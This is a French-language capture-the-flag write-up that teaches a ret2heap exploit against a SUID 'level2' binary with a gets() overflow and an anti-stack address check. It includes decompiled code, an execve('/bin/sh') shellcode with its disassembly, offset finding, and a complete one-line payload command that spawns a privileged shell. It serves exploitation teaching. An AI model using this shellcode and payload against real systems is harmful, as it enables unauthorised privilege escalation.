# Level2 - README Pédagogique

## 🎯 Objectif
Exploiter un **buffer overflow** combiné à une **injection de shellcode sur le heap** pour contourner une protection anti-stack.

**Technique** : ret2heap (Return-to-Heap)

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l level2
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
    ^
    └─ Bit SUID actif → s'exécute avec les droits de level3
```

### Tests comportementaux
```bash
$ ./level2
test
test

$ echo "AAAA" | ./level2
AAAA

$ python -c "print('A' * 100)" | ./level2
Segmentation fault (core dumped)
```

**Observation** : Buffer overflow détecté.

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void p(void)
{
    char local_50[76];
    unsigned int ret_addr;
    
    fflush(stdout);
    gets(local_50);
    
    // Lecture de la saved return address sur la stack
    ret_addr = *(unsigned int *)(__builtin_frame_address(0) + 4);
    
    // Protection anti-stack : bloque adresses >= 0xb0000000
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", (void *)ret_addr);
        _exit(1);
    }
    
    puts(local_50);
    strdup(local_50);  // Copie local_50 sur le heap
}

int main(void)
{
    p();
    return 0;
}
```

**Observations critiques** :
1. `gets()` → Pas de vérification de longueur (buffer overflow possible)
2. **Protection anti-stack** → Bloque les adresses commençant par `0xb`
3. `strdup()` → Copie le buffer sur le **heap**

---

## 💣 Vulnérabilités identifiées

### 1. Buffer Overflow (gets)

**Code vulnérable** :
```c
char local_50[76];
gets(local_50);  // ⚠️ Pas de limite !
```

Même principe que level1, mais avec une **protection supplémentaire**.

### 2. Protection anti-stack

**Code de protection** :
```c
if ((ret_addr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", (void *)ret_addr);
    _exit(1);
}
```

**Explication du masque binaire** :
```
0xb0000000 en binaire : 1011 0000 0000 0000 0000 0000 0000 0000
                        ^^^^
                        Détecte si les 4 premiers bits = 1011 (0xb)

Exemples :
0xbfff1234 & 0xb0000000 = 0xb0000000 ✅ Bloqué (stack)
0xb7ff1234 & 0xb0000000 = 0xb0000000 ✅ Bloqué (libc)
0x0804a008 & 0xb0000000 = 0x00000000 ❌ Pas bloqué (heap) ✅
```

**Pourquoi cette protection ?**
- La stack se trouve à `0xbfxxxxxx`
- La libc se trouve à `0xb7xxxxxx`
- Bloquer `0xb...` empêche les attaques **ret2stack** et **ret2libc** classiques

**Notre solution** : Utiliser le **heap** (adresses `0x08...`) !

---

## 🔑 Concepts clés

### 1. Stack vs Heap

| Caractéristique | Stack | Heap |
|----------------|-------|------|
| **Adresses** | `0xbfxxxxxx` (hautes) | `0x0804xxxx` (basses) |
| **Croissance** | Vers le bas ↓ | Vers le haut ↑ |
| **Allocation** | Automatique (variables locales) | Manuelle (`malloc`, `strdup`) |
| **Durée de vie** | Jusqu'à la fin de la fonction | Jusqu'au `free()` |
| **Vitesse** | Rapide | Plus lent |

**Layout mémoire Linux 32-bit** :
```
0xFFFFFFFF ┌─────────────────┐
           │ Kernel space    │
0xC0000000 ├─────────────────┤
           │ Stack           │ ← 0xbfxxxxxx ⚠️ Bloqué !
0xB0000000 ├─────────────────┤
           │ Shared libs     │ ← 0xb7xxxxxx ⚠️ Bloqué !
0x40000000 ├─────────────────┤
           │ Heap            │ ← 0x0804xxxx ✅ Pas bloqué !
0x08048000 ├─────────────────┤
           │ .data/.bss      │
           │ .text (code)    │
0x00000000 └─────────────────┘
```

### 2. La fonction strdup()

**Prototype** :
```c
char *strdup(const char *s);
```

**Fonctionnement** :
1. Calcule `len = strlen(s)`
2. Alloue `malloc(len + 1)` sur le **heap**
3. Copie la chaîne : `strcpy(nouveau, s)`
4. Retourne le pointeur vers le heap

**Pourquoi c'est exploitable ?**
- Copie **TOUT** le contenu (y compris notre shellcode)
- Allocation sur le **heap** (adresse `0x08...`)
- Pas de vérification de contenu

**Exemple** :
```c
char *ptr = strdup("test");
// ptr pointe vers le heap à ~0x0804a008
```

### 3. Trouver l'adresse heap avec ltrace

**ltrace** = Library Tracer (trace les appels de bibliothèque)

```bash
$ echo "AAAA" | ltrace ./level2
...
strdup("AAAA")           = 0x0804a008
                           ^^^^^^^^^^
                           Adresse heap !
...
```

**ltrace vs strace** :

| Outil | Trace | Exemple |
|-------|-------|---------|
| **ltrace** | Appels de **bibliothèque** (libc) | `strdup()`, `printf()`, `malloc()` |
| **strace** | Appels **système** (kernel) | `read()`, `write()`, `execve()` |

**Pourquoi ltrace ici ?**
- `strdup()` affiche directement l'adresse de retour
- Plus simple que GDB pour ce cas

**Sans ltrace** :
```bash
# Méthode GDB
$ gdb level2
(gdb) break strdup
(gdb) run
AAAA
(gdb) finish
Value returned is $1 = 0x0804a008

# Méthode /proc
$ cat /proc/$(pgrep level2)/maps | grep heap
0804a000-0806b000 rw-p [heap]
```

### 4. Le Shellcode

**Définition** : Code machine (assembleur en bytes) injecté dans un programme pour exécuter une commande.

**Shellcode utilisé (21 octets)** :
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

**Ce qu'il fait** : `execve("/bin/sh", NULL, NULL)`

**En assembleur** :
```asm
push 0x0b           ; \x6a\x0b  - syscall number (execve = 11)
pop eax             ; \x58      - eax = 11
cdq                 ; \x99      - edx = 0
push edx            ; \x52      - NULL terminator
push 0x68732f2f     ; \x68\x2f\x2f\x73\x68 - "//sh"
push 0x6e69622f     ; \x68\x2f\x62\x69\x6e - "/bin"
mov ebx, esp        ; \x89\xe3  - ebx pointe vers "/bin//sh"
xor ecx, ecx        ; \x31\xc9  - argv = NULL
int 0x80            ; \xcd\x80  - syscall
```

**Contraintes d'un shellcode** :
- ❌ Pas de bytes NULL (`\x00`) → casserait la chaîne pour `gets()`
- ✅ Le plus court possible
- ✅ Position-independent (fonctionne à n'importe quelle adresse)

**Pourquoi 21 octets ?**
- Version optimisée trouvée sur shell-storm.org
- Versions plus courtes existent mais sont moins portables
- Doit tenir dans le buffer (< 80 octets)

### 5. ret2heap (Return-to-Heap)

**Définition** : Technique d'exploitation où on redirige EIP vers du code sur le **heap**.

**Nomenclature des exploits** :
```
ret2func     : Retourner vers une fonction existante (level1)
ret2libc     : Retourner vers une fonction de la libc
ret2heap     : Retourner vers du code sur le heap (level2) ✅
ret2stack    : Retourner vers du code sur la stack
ROP          : Return-Oriented Programming (chaîner des gadgets)
```

**Pourquoi ret2heap ici ?**
- La stack est **bloquée** (protection `0xb...`)
- Le heap est **accessible** (adresses `0x08...`)
- `strdup()` copie notre shellcode sur le heap

---

## 🚀 Construction du payload

### Déterminer l'offset

#### Méthode : Pattern cyclique
```bash
$ gdb level2
(gdb) run
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A...
^D

Program received signal SIGSEGV
(gdb) info registers eip
eip  0x41366441  # "dA6A" en ASCII

# Chercher "dA6A" dans le pattern → position 80
```

**Vérification** :
```bash
(gdb) run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBB
^D
(gdb) info registers eip
eip  0x42424242  # "BBBB" ✅
```

**Offset = 80 octets**

### Structure du payload

```
[Shellcode 21 octets][Padding 59 octets][Adresse heap 4 octets]
├────────────────────────────────────┤
              80 octets               ← Remplissage
                                     [4 octets] ← Écrase saved EIP
```

**Calcul du padding** :
```
Offset total     = 80 octets
Shellcode        = 21 octets
Padding nécessaire = 80 - 21 = 59 octets
```

**Adresse heap** : `0x0804a008` (trouvée avec ltrace)

**Conversion little-endian** :
```
0x0804a008 → \x08\xa0\x04\x08

Vérification :
  08 04 a0 08  (paires d'octets)
  08 a0 04 08  (inversé)
```

### Commande d'exploitation

```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

---

## 🔄 Déroulement de l'exploitation

### Étape par étape

#### 1. État initial
```
STACK (0xbfxxxxxx) :
┌─────────────────┐
│  local_50[76]   │ (vide)
├─────────────────┤
│  ret_addr       │ (random)
├─────────────────┤
│  Saved EBP      │ 0xbffff7a8
├─────────────────┤
│  Saved EIP      │ 0x08048521 ← Adresse de retour normale
└─────────────────┘

HEAP (0x0804a008) :
┌─────────────────┐
│     (vide)      │
└─────────────────┘
```

#### 2. gets() lit notre payload
```python
Payload : [Shellcode 21][AAA...59][0x0804a008]
```

**gets() écrit dans local_50** :
```
STACK après gets() :
┌─────────────────────────────────────┐
│ \x6a\x0b\x58...\x80 AAAA...         │ ← Shellcode + padding (80 octets)
├─────────────────────────────────────┤
│  0x0804a008                         │ ← Écrase saved EIP ✅
└─────────────────────────────────────┘
```

#### 3. Vérification de la protection
```c
ret_addr = 0x0804a008;

if ((0x0804a008 & 0xb0000000) == 0xb0000000) {
    // 0x00000000 != 0xb0000000 → Protection OK ✅
}
```

**Pas bloqué !** Le programme continue.

#### 4. strdup() copie sur le heap
```c
strdup(local_50);  // Alloue sur le heap
```

**HEAP après strdup()** :
```
HEAP (0x0804a008) :
┌─────────────────────────────────────┐
│ \x6a\x0b\x58\x99...\x80 AAAA...     │ ← Shellcode copié ici ! ✅
└─────────────────────────────────────┘
```

**Le shellcode est maintenant sur le heap à 0x0804a008.**

#### 5. La fonction p() se termine
```asm
ret  # Équivalent à : EIP = pop()
     # EIP = 0x0804a008 (lu depuis la stack)
```

#### 6. CPU saute vers le heap
```
EIP = 0x0804a008

HEAP (0x0804a008) :
┌─────────────────────────────────────┐
│ \x6a\x0b\x58\x99...\x80             │ ← CPU exécute ici ! ✅
└─────────────────────────────────────┘
    ↑
    EIP

Le CPU décode le shellcode :
→ execve("/bin/sh", NULL, NULL)
→ Shell obtenu avec les droits de level3 ! 🎉
```

---

## 📊 Schéma récapitulatif

```
┌─────────────────────────────────────────────────────────┐
│ 1. Envoi du payload                                     │
│    [Shellcode][Padding][0x0804a008]                     │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 2. gets() écrit dans local_50 (STACK)                   │
│    • Shellcode dans le buffer                           │
│    • 0x0804a008 écrase saved EIP                        │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 3. Protection vérifie 0x0804a008                        │
│    • 0x08... ne commence pas par 0xb                    │
│    • ✅ Pas bloqué !                                     │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 4. strdup() copie sur le HEAP                           │
│    • Allocation à 0x0804a008                            │
│    • Shellcode maintenant sur le heap                   │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 5. ret charge saved EIP                                 │
│    • EIP = 0x0804a008                                   │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 6. CPU exécute le shellcode                             │
│    • execve("/bin/sh")                                  │
│    • Shell avec les droits de level3 ! 🎉               │
└─────────────────────────────────────────────────────────┘
```

---

## 📝 Classification

**Type de vulnérabilités** :
- **CWE-120** : Buffer Overflow
- **CWE-676** : Use of Potentially Dangerous Function (gets)
- **CWE-787** : Out-of-bounds Write
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **ret2heap** : Return-to-Heap

---

## 🎓 Résumé

1. **Vulnérabilité** : Buffer overflow via `gets()`
2. **Protection** : Bloque les adresses stack/libc (`0xb...`)
3. **Contournement** : Utiliser le heap (adresses `0x08...`)
4. **Technique** : Injection de shellcode + ret2heap
5. **Payload** : `[Shellcode][Padding][Adresse heap]`
6. **Résultat** : Shell avec les privilèges de level3

---

## 🔐 Différences avec Level1

| Aspect | Level1 | Level2 |
|--------|--------|--------|
| **Technique** | ret2func | ret2heap |
| **Cible** | Fonction `run()` @ 0x08048444 | Heap @ 0x0804a008 |
| **Protection** | Aucune | Anti-stack (0xb...) |
| **Payload** | Padding + adresse fonction | Shellcode + padding + adresse heap |
| **Complexité** | Basique | Intermédiaire |
| **Code injecté** | Non | Oui (shellcode) |

---

## 🎯 Points clés à retenir

- **Heap vs Stack** : Deux zones mémoire avec des adresses différentes
- **Protection anti-stack** : Masque binaire pour bloquer `0xb...`
- **strdup()** : Copie sur le heap (exploitable)
- **Shellcode** : Code machine pour execve("/bin/sh")
- **ret2heap** : Rediriger EIP vers le heap
- **ltrace** : Outil pour trouver l'adresse heap facilement
- **Little-endian** : Toujours inverser l'ordre des octets